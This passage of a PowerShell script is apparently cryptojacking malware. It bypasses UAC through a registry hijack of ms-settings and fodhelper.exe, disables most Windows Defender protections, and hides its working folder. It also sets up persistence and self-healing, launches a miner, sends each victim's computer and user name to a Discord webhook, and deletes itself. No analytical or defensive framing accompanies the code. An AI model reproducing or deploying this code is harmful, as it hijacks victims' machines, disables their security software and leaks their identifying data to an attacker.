$h=[Convert]::FromBase64String('Zm9kaGVscGVyLmV4ZQ==')
$r=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Classes\ms-settings\Shell\Open\Command")
$r.SetValue('',$c)
$r.SetValue('DelegateExecute','')
Start-Process $h
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}

function Invoke-DefenseEvasion{
try{
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -ExclusionProcess $m -ErrorAction SilentlyContinue
}catch{}
}

function Enable-HugePages{
try{
cmd /c "reg add HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management /v LargeSystemCache /t REG_DWORD /d 1 /f" 2>$null
}catch{}
}

function Disable-Sleep{
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
}

function Start-RandomDelay{
$delay = Get-Random -Minimum 30 -Maximum 120
Start-Sleep $delay
}

if(![Environment]::Is64BitOperatingSystem){return}
if($env:PROCESSOR_ARCHITECTURE-ne'AMD64'){return}

Start-RandomDelay

try{Invoke-UACBypass}catch{}
try{Invoke-DefenseEvasion}catch{}
try{Enable-HugePages}catch{}
try{Disable-Sleep}catch{}
if(!(Test-Path $_s)){New-Item -Path $_s -ItemType Directory -Force|Out-Null}
Set-ItemProperty $_s -Name Attributes -Value 'Hidden,System' -ErrorAction SilentlyContinue
try{Write-StealthWatchdog}catch{}
try{Write-SelfHealScript}catch{}
try{Set-Persistence}catch{}
try{Set-DeepPersistence}catch{}
$minerResult=try{Launch-Miner}catch{($_.Exception.Message)}

Send-DiscordWebhook "New deployment: $env:COMPUTERNAME | $env:USERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | result: $minerResult"

try{
Remove-Item -Path $MyInvocation.MyCommand.Source -Force -ErrorAction SilentlyContinue
}catch{}
